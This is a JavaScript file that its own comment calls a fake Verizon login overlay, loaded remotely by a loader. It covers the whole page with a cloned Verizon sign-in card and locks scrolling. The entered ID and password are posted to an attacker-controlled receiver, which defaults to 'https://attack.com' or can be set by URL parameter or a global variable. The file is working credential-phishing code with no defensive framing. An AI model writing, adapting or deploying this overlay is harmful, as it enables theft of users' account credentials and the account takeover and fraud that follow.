/* Fake Verizon login overlay, loaded remotely by a short loader.
 *
 * Receiver resolution order:
 *   1. ?r=<url>  on the page URL
 *   2. window.RCV if the page already set it
 *   3. DEFAULT below
 */
(function () {
  if (window.__p) return;
  window.__p = 1;

  var DEFAULT = 'https://attack.com';
  var RECV = window.RCV ||
    (new URLSearchParams(location.search).get('r')) || DEFAULT;

  var d = document;
  var C = function (t) { return d.createElement(t); };

  var wrap = C('div');
  wrap.style.cssText = 'position:fixed!important;left:0!important;top:0!important;width:100%!important;' +
    'height:100%!important;z-index:2147483647!important;background:#fff!important;margin:0!important;' +
    'padding:0!important;display:flex!important;align-items:center!important;justify-content:center!important;' +
    'font-family:Arial,Helvetica,sans-serif!important';

  var card = C('div');
  card.style.cssText = 'width:380px!important;box-sizing:border-box!important;padding:34px 32px!important;' +
    'background:#fff!important;border:1px solid #d8d8d8!important;border-radius:8px!important;' +
    'box-shadow:0 2px 14px rgba(0,0,0,.12)!important';

  var bar = C('div');
  bar.style.cssText = 'height:4px!important;background:#cd040b!important;margin:-34px -32px 26px!important';

  var form = C('form');
  form.action = RECV;
  form.method = 'post';
  form.style.cssText = 'margin:0!important';

  function label(t, s) {
    var e = C('div');
    e.textContent = t;
    e.style.cssText = s;
    return e;
  }

  function field(type, ph, name) {
    var e = C('input');
    e.type = type;
    e.name = name;
    e.placeholder = ph;
    e.setAttribute('autocomplete', type === 'password' ? 'current-password' : 'username');
    e.style.cssText = 'width:100%!important;height:40px!important;box-sizing:border-box!important;' +
      'border:1px solid #b3b3b3!important;border-radius:4px!important;padding:0 10px!important;' +
      'font-size:14px!important;outline:none!important;background:#fff!important';
    return e;
  }

  var u = field('text', 'Verizon ID', 'u');
  var p = field('password', 'Password', 'p');

  var btn = C('button');
  btn.type = 'submit';
  btn.textContent = 'Sign in';
  btn.style.cssText = 'width:100%!important;height:42px!important;margin-top:20px!important;' +
    'background:#cd040b!important;color:#fff!important;border:0!important;border-radius:4px!important;' +
    'font-size:15px!important;font-weight:600!important;cursor:pointer!important';

  form.appendChild(label('Verizon ID', 'font-size:12px!important;color:#333!important;margin-bottom:6px!important'));
  form.appendChild(u);
  form.appendChild(label('Password', 'font-size:12px!important;color:#333!important;margin:14px 0 6px!important'));
  form.appendChild(p);
  form.appendChild(btn);

  card.appendChild(bar);
  card.appendChild(label('verizon', 'font-size:26px!important;font-weight:700!important;color:#000!important;letter-spacing:-1px!important'));
  card.appendChild(label('Sign in to your account', 'margin:18px 0 6px!important;font-size:19px!important;font-weight:600!important;color:#000!important'));
  card.appendChild(label('Use your Verizon ID to continue', 'font-size:12px!important;color:#666!important;margin-bottom:18px!important'));
  card.appendChild(form);

  wrap.appendChild(card);
  d.body.appendChild(wrap);
  d.documentElement.style.overflow = 'hidden';
  d.body.style.overflow = 'hidden';
  u.focus();
})();
